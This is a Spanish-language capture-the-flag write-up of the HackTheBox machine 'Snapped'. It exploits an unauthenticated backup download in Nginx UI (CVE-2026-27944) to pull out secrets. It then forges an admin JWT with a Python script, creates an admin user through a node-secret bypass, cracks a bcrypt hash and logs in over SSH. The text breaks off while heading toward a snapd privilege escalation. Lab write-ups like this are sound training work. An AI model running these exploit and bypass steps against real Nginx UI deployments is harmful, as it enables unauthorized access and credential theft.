---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
---

# Snapped HackTheBox (Hard)

## Contexto de la maquina

### Trayectoria Snapped

<figure><img src="../../.gitbook/assets/trayectoria_snapped.png" alt=""><figcaption></figcaption></figure>

### Descripción

La máquina **Snapped** es un entorno Linux que expone un servicio web basado en **Nginx** junto a una interfaz administrativa (`nginx-ui`). El reto consiste en comprometer dicha aplicación web, extraer información sensible a través de una vulnerabilidad en su API y escalar privilegios hasta obtener acceso como `root`.

**Objetivo**

* Obtener acceso inicial al panel administrativo.
* Comprometer credenciales de usuarios.
* Acceder al sistema mediante SSH.
* Escalar privilegios hasta `root`.

**Tipo de máquina**

* Linux
* Web + API backend
* Escalada de privilegios local

**Habilidades y técnicas evaluadas**

* Enumeración web avanzada (subdominios y APIs)
* Análisis de tráfico HTTP
* Explotación de vulnerabilidades en APIs
* Criptografía aplicada (JWT, AES)
* Extracción y cracking de hashes
* Escalada de privilegios mediante vulnerabilidades del sistema

### Análisis de vulnerabilidades

<figure><img src="../../.gitbook/assets/vuln1_snapped.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln2_snapped.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln3_snapped.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln4_snapped.png" alt=""><figcaption></figcaption></figure>

## Escaneo de puertos

Comenzamos realizando un escaneo completo de puertos TCP para identificar los servicios expuestos en la máquina objetivo.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

Una vez identificados los puertos abiertos, lanzamos un escaneo más detallado sobre ellos para obtener versiones y scripts por defecto.

```shell
nmap -sCV -p<PORTS> <IP>
```

Resultado:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 16:00 -0400
Nmap scan report for 10.129.15.20
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds
```

Observamos que únicamente hay **dos puertos abiertos**:

* **22 (SSH)** → Acceso remoto
* **80 (HTTP)** → Servidor web

El servicio web nos indica una redirección hacia el dominio:

```
http://snapped.htb/
```

Por lo tanto, lo añadimos a nuestro archivo `/etc/hosts`:

```shell
nano /etc/hosts

#Dentro del nano
<IP>         snapped.htb
```

Accedemos al sitio web:

```
URL = http://snapped.htb/
```

Respuesta:

<figure><img src="../../.gitbook/assets/Pasted image 20260326210312.png" alt=""><figcaption></figcaption></figure>

La página no muestra nada especialmente relevante a simple vista, por lo que continuamos con enumeración más profunda.

## Fuzzing de subdominios (FFUF)

Procedemos a realizar **fuzzing de subdominios** utilizando `ffuf`:

```shell
ffuf -u http://snapped.htb -H "Host: FUZZ.snapped.htb" -w <WORDLIST> -fs 154
```

Respuesta:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snapped.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.snapped.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 39ms]
Admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 39ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Identificamos el subdominio:

* `admin.snapped.htb`

Lo añadimos al `/etc/hosts`:

```shell
nano /etc/hosts

#Dentro del nano
<IP>         snapped.htb admin.snapped.htb
```

Accedemos:

```
URL = http://admin.snapped.htb/
```

Respuesta:

<figure><img src="../../.gitbook/assets/Pasted image 20260326211111.png" alt=""><figcaption></figcaption></figure>

## Análisis del panel de login

Nos encontramos con un **panel de autenticación**. Probamos credenciales por defecto (`admin:admin`), pero no funcionan.

Sin embargo, observamos un comportamiento interesante:\
la respuesta del servidor tarda más de lo habitual, lo cual sugiere procesamiento adicional en backend.

Esto nos lleva a inspeccionar las peticiones mediante las herramientas de desarrollo del navegador (**Network**).

### Análisis de peticiones

Al intentar autenticarnos, identificamos varias peticiones, entre ellas una especialmente relevante:

* `public_key` (respuesta JSON)

Respuesta:

<figure><img src="../../.gitbook/assets/Pasted image 20260327111502.png" alt=""><figcaption></figcaption></figure>

```json
{
	"public_key": "-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEApwmzpNT+M9Pt1NEKwryJTTGgC78XYRE6S36k3JVbTnFFEGsE68wk\nhq6J3F0A8e2GxvImNqSBba5z37cg0Xe7LfCO41lJbhLAiYEKPynoH0b2PP7AkTL0\nVckzjxpDddnHrptlE/bo2KQo8LvkuXjqdlkKolisYI1Gm28WAGQvaSNfmcAb0hjP\nEjyaOoZiZirTupakoZARHBIqEUpmVOP1zyQLKMbaMX//I8K2ANF5D0+lftB094Yt\nqvP59KOuQj5nQW7VX9Ha/vt4EouCHIiFkNOAidc5q1UgBlm52QXIIyQzHBO3l8wj\n5BKV5yuqugLCORY2/pZXsLEYGBy4bHT89wIDAQAB\n-----END RSA PUBLIC KEY-----\n",
	"request_id": "363e3f0e-ab21-4fe4-81d4-78e09fb80111"
}
```

Esto indica que la aplicación utiliza **criptografía asimétrica (RSA)**, posiblemente para proteger credenciales o intercambios de datos.

Aunque en este punto no es explotable directamente, confirma la existencia de una API backend.

## Enumeración de APIs

Recargando la página y capturando tráfico con **Burp Suite**, identificamos varias rutas API:

<figure><img src="../../.gitbook/assets/Pasted image 20260327113050.png" alt=""><figcaption></figcaption></figure>

* `/api/install`

<figure><img src="../../.gitbook/assets/Pasted image 20260327113215.png" alt=""><figcaption></figcaption></figure>

* `/api/casdoor_uri`

<figure><img src="../../.gitbook/assets/Pasted image 20260327113240.png" alt=""><figcaption></figcaption></figure>

* `/api/passkeys/config`

<figure><img src="../../.gitbook/assets/Pasted image 20260327113259.png" alt=""><figcaption></figcaption></figure>

* `/api/icp_settings`

<figure><img src="../../.gitbook/assets/Pasted image 20260327113319.png" alt=""><figcaption></figcaption></figure>

Tras analizarlas manualmente en el **Repeater**, observamos que:

* La mayoría no devuelven información útil
* `/api/install` responde, pero cuenta con validaciones internas que impiden su abuso directo

## Fuzzing de endpoints API

Dado que hemos identificado la existencia de una API backend, procedemos a realizar **fuzzing de endpoints** para descubrir rutas adicionales accesibles.

```shell
ffuf -u http://admin.snapped.htb/api/FUZZ -w <WORDLIST> -c -t 50 -fs 34
```

Respuesta:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://admin.snapped.htb/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 34
________________________________________________

install                 [Status: 200, Size: 29, Words: 1, Lines: 1, Duration: 35ms]
backup                  [Status: 200, Size: 18370, Words: 81, Lines: 66, Duration: 56ms]
licenses                [Status: 200, Size: 52782, Words: 9, Lines: 1, Duration: 47ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

De los resultados obtenidos, el endpoint más interesante es:

* `/api/backup`

Este endpoint no había sido identificado previamente y devuelve una respuesta de tamaño considerable, lo que sugiere que puede contener información relevante.

## Análisis del endpoint `/api/backup`

Al acceder directamente al endpoint, observamos que el servidor devuelve un archivo comprimido:

```shell
curl "http://admin.snapped.htb/api/backup" -o backup_file.zip
```

Procedemos a descomprimirlo:

```shell
unzip backup_file.zip
```

Contenido:

```
.rw-r--r-- kali kali 208 B  Fri Mar 27 07:00:37 2026  hash_info.txt
.rw-r--r-- kali kali 7.6 KB Fri Mar 27 07:00:37 2026  nginx-ui.zip
.rw-r--r-- kali kali 9.7 KB Fri Mar 27 07:00:37 2026  nginx.zip
```

Esto resulta especialmente interesante, ya que aparentemente contiene backups de distintos componentes de la aplicación (probablemente frontend/backend o panel administrativo).

### Intento de extracción

Intentamos descomprimir los archivos internos:

```shell
# Primero el archivo "nginx-ui.zip"
mkdir nginx-ui
mv nginx-ui.zip nginx-ui
cd nginx-ui/
unzip nginx-ui.zip

# Segundo el archivo "nginx.zip"
mkdir nginx
mv nginx.zip nginx
cd nginx/
unzip nginx.zip
```

Sin embargo, observamos que:

* Los archivos **no son ZIPs válidos**
* El contenido parece estar **cifrado u ofuscado**

Esto indica que el backup implementa algún mecanismo de protección adicional.

### Análisis de la respuesta HTTP

Capturando la descarga con **Burp Suite**, identificamos una cabecera relevante:

<figure><img src="../../.gitbook/assets/Pasted image 20260327120942.png" alt=""><figcaption></figcaption></figure>

```
X-Backup-Security: gZv7Ml7LNU0dOIlYcjkIIDAQsA13Ybr0uD8IE5Yf11w=:DKeYpYP7mQ1rTyn9l7zxzg==
```

Esta cabecera sugiere:

* Uso de cifrado simétrico (probablemente AES)
* Inclusión de **clave + vector de inicialización (IV)**
* Mecanismo propietario de protección del backup

Tras investigar este comportamiento, encontramos que está relacionado con una vulnerabilidad conocida.

## CVE-2026-27944

<figure><img src="../../.gitbook/assets/vuln1Card_snapped.png" alt=""><figcaption></figcaption></figure>

Este comportamiento está asociado a la vulnerabilidad **CVE-2026-27944**, que afecta a Nginx UI y permite:

* Descarga de backups sin autenticación
* Obtención de claves criptográficas desde cabeceras HTTP
* Descifrado completo del contenido del backup

Existe un PoC público que automatiza este proceso.

URL = [PoC CVE-2026-27944 GitHub](https://github.com/Skynoxk/CVE-2026-27944)

### Explotación del CVE

Nos descargamos el exploit y ejecutamos el mismo:

```shell
python3 -m venv .venv; source .venv/bin/activate
pip install pycryptodome
python3 exploit_enhanced.py --target http://admin.snapped.htb --decrypt --show-secrets
```

Respuesta:

```


  ____  _  __                           _    

 / ___|| |/ /_   _ _ __   _____  _ __| | __

 \___ \| ' /| | | | '_ \ / _ \ \/ /| |/ /

  ___) | . \| |_| | | | | (_) >  < |   < 

 |____/|_|\_\\__, |_| |_|\___/_/\_\|_|\_\

             |___/                       

    
======================================================================
CVE-2026-27944 - Nginx UI Unauthenticated Backup Download + Dashboard Access
======================================================================

[*] Downloading backup from http://admin.snapped.htb/api/backup
[+] Backup downloaded successfully (18370 bytes)
[+] Saved to: backup.bin

[*] X-Backup-Security header: o9LZCzJstrGDktDgLOYrUxzGc/agqnCgnwyVYtkMer8=:KXfmD5T4deghRGVivyjSvA==
[+] Parsed AES-256 key: o9LZCzJstrGDktDgLOYrUxzGc/agqnCgnwyVYtkMer8=
[+] Parsed AES IV    : KXfmD5T4deghRGVivyjSvA==

[+] Key length: 32 bytes (AES-256 ✓)
[+] IV length : 16 bytes (AES block size ✓)

[*] Extracting encrypted backup to backup_extracted
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting hash_info.txt...
    → Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
[*] Decrypting nginx-ui.zip...
    → Saved to backup_extracted/nginx-ui_decrypted.zip (7759 bytes)
    → Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...
    → Saved to backup_extracted/nginx_decrypted.zip (9936 bytes)
    → Extracted 22 files to backup_extracted/nginx

[*] Hash info:
nginx-ui_hash: 070ddd40ffa91627f927cb1864fc7f232784bda770f50263282ca23156018158
nginx_hash: c345b13d0ef93034a5cc834c479b9d064a03e108fb66ded9faa3e87222a140ca
timestamp: 20260327-071840
version: 2.3.2


[*] Extracting secrets from backup_extracted/nginx-ui/app.ini
[+] Secrets extracted:
    JWT Secret    : 6c4af436-035a-4942-9ca6-172b36696ce9
    Node Secret   : c64d7ca1-19cb-4ebe-96d4-49037e7df78e
    Crypto Secret : 5c942292647d73f597f47c0be2237bf7347cdb70a0e8e8558e448318862357d6
    Email         : admin@test.htb

[*] Verifying Node Secret bypass...
[+] Node Secret verified! Admin API access confirmed
[+] Total users in system: 2
```

El exploit realiza automáticamente:

1. Descarga del backup
2. Extracción de la cabecera `X-Backup-Security`
3. Obtención de:
   * Clave AES-256
   * Vector de inicialización (IV)
4. Descifrado de todos los archivos

### Información obtenida

Tras el descifrado, se extraen secretos sensibles del archivo de configuración:

```
JWT Secret    : 6c4af436-035a-4942-9ca6-172b36696ce9
Node Secret   : c64d7ca1-19cb-4ebe-96d4-49037e7df78e
Crypto Secret : 5c942292647d73f597f47c0be2237bf7347cdb70a0e8e8558e448318862357d6
Email         : admin@test.htb
```

Esto es crítico, ya que nos permite:

* Firmar tokens JWT válidos
* Suplantar usuarios
* Acceder a endpoints restringidos

## Generación de JWT (suplantación de admin)

Con los secretos obtenidos, procedemos a generar un **token JWT válido** para el usuario `admin`.

<figure><img src="../../.gitbook/assets/vuln2Card_snapped.png" alt=""><figcaption></figcaption></figure>

> createJWT.py

```python
#!/usr/bin/env python3
import jwt
import requests
import json

# Secretos obtenidos
NODE_SECRET = "c64d7ca1-19cb-4ebe-96d4-49037e7df78e"
JWT_SECRET = "6c4af436-035a-4942-9ca6-172b36696ce9"

# Generar token JWT
payload = {
    "username": "admin",
    "role": "admin",
    "node_secret": NODE_SECRET
}

# Usar PyJWT correctamente
token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
print(f"Token JWT: {token}")

# Probar acceso al dashboard
headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

# Probar endpoints
url = "http://admin.snapped.htb/api/dashboard"
response = requests.get(url, headers=headers)
print(f"Dashboard: {response.status_code}")
if response.status_code == 200:
    print(f"Response: {response.text[:500]}")
```

Ejecutamos el script:

```shell
python3 -m venv .venv; source .venv/bin/activate
pip3 install PyJWT encode jwt
python3 createJWT.py
```

Respuesta:

```
Token JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwibm9kZV9zZWNyZXQiOiJjNjRkN2NhMS0xOWNiLTRlYmUtOTZkNC00OTAzN2U3ZGY3OGUifQ.7Q9AaKMwBqMkjXpupet4DgbOzjE6KCXlO7wD5LaMYY0
```

Se genera correctamente un token JWT válido.

## Limitación encontrada

Intentamos utilizar el token mediante cookies en el navegador:

* Añadiendo `token=<JWT>` en el almacenamiento del navegador.
* Recargando la página.

**Comportamiento observado:**

* El acceso al panel de administración se produce brevemente.
* Sin embargo, el sistema invalida/elimina la cookie automáticamente.

**Conclusión:**

Existe algún mecanismo adicional de validación (posiblemente server-side o relacionado con sesiones), por lo que esta vía no es completamente fiable.

## Creación de usuario vía exploit (No es la vía principal)

El exploit no solo permite la extracción de backups y secretos, sino que además incorpora funcionalidad para **crear usuarios directamente en el sistema**, aprovechando el bypass basado en el `Node Secret`.

Ejecutamos el exploit con la opción de creación de usuario:

```shell
python3 exploit_enhanced.py --target http://admin.snapped.htb --decrypt --decrypt --create-user diseo --password 'P@ssw0rd!'
```

Respuesta:

```

  ____  _  __                           _    

 / ___|| |/ /_   _ _ __   _____  _ __| | __

 \___ \| ' /| | | | '_ \ / _ \ \/ /| |/ /

  ___) | . \| |_| | | | | (_) >  < |   < 

 |____/|_|\_\\__, |_| |_|\___/_/\_\|_|\_\

             |___/                       

    
======================================================================
CVE-2026-27944 - Nginx UI Unauthenticated Backup Download + Dashboard Access
======================================================================

[*] Downloading backup from http://admin.snapped.htb/api/backup
[+] Backup downloaded successfully (18370 bytes)
[+] Saved to: backup.bin

[*] X-Backup-Security header: 0QpUNudu4qKajHXUNA6uyg8q4OwMD4SQxb6IOoYNlTk=:Wwxf8m1quTDSvwSmHJZmfQ==
[+] Parsed AES-256 key: 0QpUNudu4qKajHXUNA6uyg8q4OwMD4SQxb6IOoYNlTk=
[+] Parsed AES IV    : Wwxf8m1quTDSvwSmHJZmfQ==

[+] Key length: 32 bytes (AES-256 ✓)
[+] IV length : 16 bytes (AES block size ✓)

[*] Extracting encrypted backup to backup_extracted
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting hash_info.txt...
    → Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
[*] Decrypting nginx-ui.zip...
    → Saved to backup_extracted/nginx-ui_decrypted.zip (7759 bytes)
    → Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...
    → Saved to backup_extracted/nginx_decrypted.zip (9936 bytes)
    → Extracted 22 files to backup_extracted/nginx

[*] Hash info:
nginx-ui_hash: aca07a23f885b72958e085a554cb63d0c84858800c292a70c575d0a9cefb0f3c
nginx_hash: 1cc7fb5644d650c7c742d65448ec5a0c80f3f5968136ba69def515ae7d45a8de
timestamp: 20260327-073054
version: 2.3.2


[*] Extracting secrets from backup_extracted/nginx-ui/app.ini
[+] Secrets extracted:
    JWT Secret    : 6c4af436-035a-4942-9ca6-172b36696ce9
    Node Secret   : c64d7ca1-19cb-4ebe-96d4-49037e7df78e
    Crypto Secret : 5c942292647d73f597f47c0be2237bf7347cdb70a0e8e8558e448318862357d6
    Email         : admin@test.htb

[*] Verifying Node Secret bypass...
[+] Node Secret verified! Admin API access confirmed
[+] Total users in system: 2

[*] Creating admin user 'diseo' via Node Secret bypass...
[+] User 'diseo' created successfully!
[+] Credentials: diseo / P@ssw0rd!

[*] Logging in as 'diseo'...
[!] Login failed. Status: 400
[!] Response: {"scope":"middleware","code":40001,"message":"decryption failed"}

======================================================================
EXPLOITATION SUCCESSFUL - DASHBOARD ACCESS AVAILABLE
======================================================================

[+] Dashboard Access Methods:

1. Direct Login (Web Browser):
   URL      : http://admin.snapped.htb
   Username : diseo
   Password : P@ssw0rd!

2. Direct API Access (Node Secret Bypass):
   curl -H 'X-Node-Secret: c64d7ca1-19cb-4ebe-96d4-49037e7df78e' http://admin.snapped.htb/api/users
   curl -H 'X-Node-Secret: c64d7ca1-19cb-4ebe-96d4-49037e7df78e' http://admin.snapped.htb/api/settings

======================================================================
```

**Análisis:**

* El exploit reutiliza los secretos obtenidos previamente (`Node Secret`) para autenticarse contra la API interna.
* Se realiza un bypass de autenticación que permite la creación de usuarios con privilegios administrativos.

## Acceso al panel de administración

Probamos las credenciales creadas manualmente desde el panel de login:

```
User: diseo
Pass: P@ssw0rd!
```

Respuesta:

<figure><img src="../../.gitbook/assets/Pasted image 20260327123220.png" alt=""><figcaption></figcaption></figure>

Accedemos correctamente al panel de administración.

Una vez dentro, navegamos a la sección **Manage Users**, donde podemos observar:

<figure><img src="../../.gitbook/assets/Pasted image 20260327123429.png" alt=""><figcaption></figcaption></figure>

* Usuarios existentes en el sistema:
  * `admin`
  * `jonathan`
* Todos los usuarios tienen el **2FA deshabilitado**, lo cual reduce significativamente la seguridad del sistema.

## Escalate user jonathan

<figure><img src="../../.gitbook/assets/vuln3Card_snapped.png" alt=""><figcaption></figcaption></figure>

En este punto, aunque ya disponemos de acceso administrativo al panel web, no encontramos funcionalidades evidentes que permitan ejecutar comandos directamente en el sistema o comprometer el host a nivel de sistema operativo.

Por ello, decidimos retomar información previamente obtenida durante la fase de explotación.

### Revisión del contenido extraído (`backup_extracted`)

Al ejecutar anteriormente el exploit:

```shell
python3 exploit_enhanced.py --target http://admin.snapped.htb --decrypt --show-secrets
```

Se generó automáticamente el directorio:

```
backup_extracted/
```

Inicialmente este contenido pasó desapercibido, pero contiene información potencialmente sensible que puede ser aprovechada para continuar con la intrusión.

#### Estructura del directorio:

```
drwxrwxr-x kali kali 4.0 KB Fri Mar 27 07:52:39 2026  nginx
drwxrwxr-x kali kali 4.0 KB Fri Mar 27 07:52:39 2026  nginx-ui
.rw-rw-r-- kali kali 208 B  Fri Mar 27 07:52:39 2026  hash_info.txt
.rw-rw-r-- kali kali 199 B  Fri Mar 27 07:52:39 2026  hash_info.txt.decrypted
.rw-rw-r-- kali kali 8.0 KB Fri Mar 27 07:52:39 2026  nginx-ui.zip
.rw-rw-r-- kali kali 8.0 KB Fri Mar 27 07:52:39 2026  nginx-ui_decrypted.zip
.rw-rw-r-- kali kali 9.7 KB Fri Mar 27 07:52:39 2026  nginx.zip
.rw-rw-r-- kali kali 9.7 KB Fri Mar 27 07:52:39 2026  nginx_decrypted.zip
```

### Análisis de configuraciones

#### Carpeta `nginx`

Contiene configuraciones del servidor web (virtual hosts, módulos, etc.), pero no aporta credenciales directamente útiles para la escalada.

#### Carpeta `nginx-ui`

Aquí encontramos dos archivos clave:

```
app.ini 
database.db
```

El archivo más relevante es `database.db`, ya que contiene información estructurada de la aplicación.

### Análisis de la base de datos (SQLite)

Accedemos a la base de datos utilizando `sqlite3`:

```shell
sqlite3 database.db
```

Respuesta:

```
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite>
```

Listamos las tablas disponibles:

```sql
.tables
```

Respuesta:

```
acme_users         configs            namespaces         sites            
auth_tokens        dns_credentials    nginx_log_indices  streams          
auto_backups       dns_domains        nodes              upstream_configs 
ban_ips            external_notifies  notifications      users            
certs              llm_sessions       passkeys         
config_backups     migrations         site_configs
```

La tabla que más nos interesa es `users`, ya que probablemente contenga credenciales o hashes.

Consultamos su contenido:

```sql
SELECT * FROM users;
```

Respuesta:

```
1|2026-03-19 08:22:54.41011219-04:00|2026-03-19 08:39:11.562741743-04:00||admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm|1||g�

|�7�ĝ�*�:�(��\�D�O�}u#,�|en
2|2026-03-19 09:54:01.989628406-04:00|2026-03-19 09:54:01.989628406-04:00||jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq|1||,��զ�H�։��e)5U��Z��KĦ"D���W|en
```

Observamos dos usuarios: `admin` y `jonathan`. El hash del usuario `jonathan` resulta especialmente interesante.

### Extracción del hash

> hash

```
jonathan:$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

Se trata de un hash `bcrypt`, por lo que procedemos a intentar su crackeo.

### Crackeo de contraseña (`john`)

Utilizamos `john` con un diccionario:

```shell
john --wordlist=<WORDLIST> hash
```

Respuesta:

```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
linkinpark       (jonathan)     
1g 0:00:00:02 DONE (2026-03-28 04:55) 0.4032g/s 203.2p/s 203.2c/s 203.2C/s pasaway..claire
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

La contraseña obtenida para el usuario `jonathan` es:

```
linkinpark
```

### Acceso por SSH

Con las credenciales obtenidas, intentamos acceso por SSH:

```shell
ssh jonathan@<IP>
```

Metemos como contraseña `linkinpark`...

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri Mar 20 12:27:50 2026 from 10.10.14.5
jonathan@snapped:~$ whoami
jonathan
```

Se confirma que hemos obtenido acceso válido al sistema como el usuario `jonathan`, por lo que leeremos la `flag` del usuario.

> user.txt

```
b13b8620247d7ee65faf7f385c510f17
```

## Escalate Privileges

<figure><img src="../../.gitbook/assets/vuln4Card_snapped.png" alt=""><figcaption></figcaption></figure>

En esta fase, comenzamos enumerando binarios con permisos **SUID**, ya que son un vector clásico de escalada de privilegios en sistemas Linux.

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Respuesta:

```
293    133 -rwsr-xr-x   1 root     root       135960 Apr 24  2024 /snap/snapd/21759/usr/lib/snapd/snap-confine
      880     72 -rwsr-xr-x   1 root     root        72712 Feb  6  2024 /snap/core22/1564/usr/bin/chfn
      886     44 -rwsr-xr-x   1 root     root        44808 Feb  6  2024 /snap/core22/1564/usr/bin/chsh
      952     71 -rwsr-xr-x   1 root     root        72072 Feb  6  2024 /snap/core22/1564/usr/bin/gpasswd
     1036     47 -rwsr-xr-x   1 root     root        47488 Apr  9  2024 /snap/core22/1564/usr/bin/mount
     1045     40 -rwsr-xr-x   1 root     root        40496 Feb  6  2024 /snap/core22/1564/usr/bin/newgrp
     1060     59 -rwsr-xr-x   1 root     root        59976 Feb  6  2024 /snap/core22/1564/usr/bin/passwd
     1178     55 -rwsr-xr-x   1 root     root        55680 Apr  9  2024 /snap/core22/1564/usr/bin/su
     1179    227 -rwsr-xr-x   1 root     root       232416 Apr  3  2023 /snap/core22/1564/usr/bin/sudo
     1239     35 -rwsr-xr-x   1 root     root        35200 Apr  9  2024 /snap/core22/1564/usr/bin/umount
     1331     35 -rwsr-xr--   1 root     uuidd       35112 Oct 25  2022 /snap/core22/1564/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2600    331 -rwsr-xr-x   1 root     root       338536 Jun 26  2024 /snap/core22/1564/usr/lib/openssh/ssh-keysign
     8626     19 -rwsr-xr-x   1 root     root        18736 Feb 26  2022 /snap/core22/1564/usr/libexec/polkit-agent-helper-1
    27181     64 -rwsr-xr-x   1 root     root        64152 May 30  2024 /usr/bin/passwd
    26576     40 -rwsr-xr-x   1 root     root        39296 Apr  8  2024 /usr/bin/fusermount3
    36279     40 -rwsr-xr-x   1 root     root        39296 Mar  6 11:00 /usr/bin/umount
    72996     16 -rwsr-xr-x   1 root     root        14656 Sep 23  2025 /usr/bin/vmware-user-suid-wrapper
    39252     56 -rwsr-xr-x   1 root     root        55680 Mar  6 11:00 /usr/bin/su
    27092     76 -rwsr-xr-x   1 root     root        76248 May 30  2024 /usr/bin/gpasswd
    26409    272 -rwsr-xr-x   1 root     root       277936 Mar  2 07:56 /usr/bin/sudo
    25924     72 -rwsr-xr-x   1 root     root        72792 May 30  2024 /usr/bin/chfn
    48592     32 -rwsr-xr-x   1 root     root        30952 Dec  2  2024 /usr/bin/pkexec
    26915     44 -rwsr-xr-x   1 root     root        44760 May 30  2024 /usr/bin/chsh
    35539     52 -rwsr-xr-x   1 root     root        51584 Mar  6 11:00 /usr/bin/mount
    27438     40 -rwsr-xr-x   1 root     root        40664 May 30  2024 /usr/bin/newgrp
    72088    336 -rwsr-xr-x   1 root     root       342632 Mar  4 12:55 /usr/lib/openssh/ssh-keysign
    28055     36 -rwsr-xr--   1 root     messagebus    34960 Aug  8  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    52729     20 -rwsr-xr-x   1 root     root          18736 Dec  2  2024 /usr/lib/polkit-1/polkit-agent-helper-1
    35133    156 -rwsr-xr-x   1 root     root         159016 Aug 20  2024 /usr/lib/snapd/snap-confine
    34789     16 -rwsr-sr-x   1 root     root          14488 Oct 23 13:29 /usr/lib/xorg/Xorg.wrap
    42135    412 -rwsr-xr--   1 root     dip          420416 Apr  3  2024 /usr/sbin/pppd
```

Se listan múltiples binarios con SUID, la mayoría comunes (`passwd`, `su`, `sudo`, etc.). Sin embargo, uno de ellos destaca especialmente:

```
/snap/snapd/21759/usr/lib/snapd/snap-confine
```

### Identificación del vector de ataque

El binario `snap-confine` se ejecuta con privilegios elevados (**SUID root**) y forma parte del sistema `snapd`. Este punto resulta especialmente interesante por varios motivos:

* El nombre de la máquina: **Snapped**
* Uso de `snapd` en el sistema
* Superficie de ataque conocida en este componente

Esto nos indica claramente que la vía de escalada probablemente esté relacionada con `snap`.

### Enumeración de versión

Comprobamos la versión de `snap` instalada:

```shell
snap version
```

Respuesta:

```
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic
```

### CVE-2026-3888

Si investigamos en profundidad posibles vulnerabilidades asociadas a la versión `snapd 2.63`, encontraremos una vulnerabilidad reciente identificada como:

```
CVE-2026-3888
```

Para más información, podemos consultar el advisory oficial:

URL = [Info CVE-2026-3888 GitHub](https://github.com/advisories/GHSA-grpw-jgrw-ccqr)

### Obtención de PoC

Buscando un **Proof of Concept (PoC)** que nos permita automatizar la explotación, encontramos el siguiente repositorio:

